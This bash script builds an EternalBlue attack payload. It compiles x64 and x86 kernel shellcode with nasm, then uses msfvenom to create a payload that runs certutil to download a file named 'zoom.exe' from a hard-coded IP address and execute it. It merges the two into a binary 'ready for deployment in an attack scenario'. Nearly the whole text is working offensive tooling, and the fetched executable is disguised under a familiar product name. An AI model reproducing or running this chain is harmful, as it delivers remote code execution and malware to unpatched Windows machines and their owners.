#!/bin/bash
# This script compiles kernel shellcode for both x64 and x86 architectures, specifically tailored for the Eternal Blue exploit.
# It then generates a payload using msfvenom that utilizes certutil, a command-line utility that's part of Microsoft's
# Certificate Services, to download and execute the file "zoom.exe" from a specified URL. This technique is often used
# in penetration testing and by malicious actors to execute remote code on a vulnerable machine as part of the exploitation process.
# The script concludes by merging the compiled kernel shellcode with the generated payload into a single executable binary
# for each architecture, ready for deployment in an attack scenario exploiting the Eternal Blue vulnerability.



set -e
cat << "EOF"
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
EOF
echo "Eternal Blue Windows Shellcode Compiler"
echo
echo "Let's compile them windoos shellcodezzz"
echo
echo "Compiling x64 kernel shellcode"
nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
echo "'Compiling x86 kernel shellcode'"
nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
echo "kernel shellcode compiled"

# Using certutil to download and execute zoom.exe
CMD="cmd /c certutil -urlcache -f http://3.21.21.191/zoom.exe %TEMP%\\zoom.exe & start %TEMP%\\zoom.exe"

# Generate payload with msfvenom
echo "Generating payload to download and execute zoom.exe using certutil..."
msfvenom -p windows/x64/exec CMD="$CMD" -f raw -o sc_x64_msf.bin EXITFUNC=thread

echo "Payload for x64 generated."

echo "MERGING SHELLCODE WOOOO!!!"
cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
# If there's an x86 version needed, follow similar steps to generate sc_x86_msf.bin and merge it.

echo "Shellcode merged successfully."

echo "DONE"
exit 0
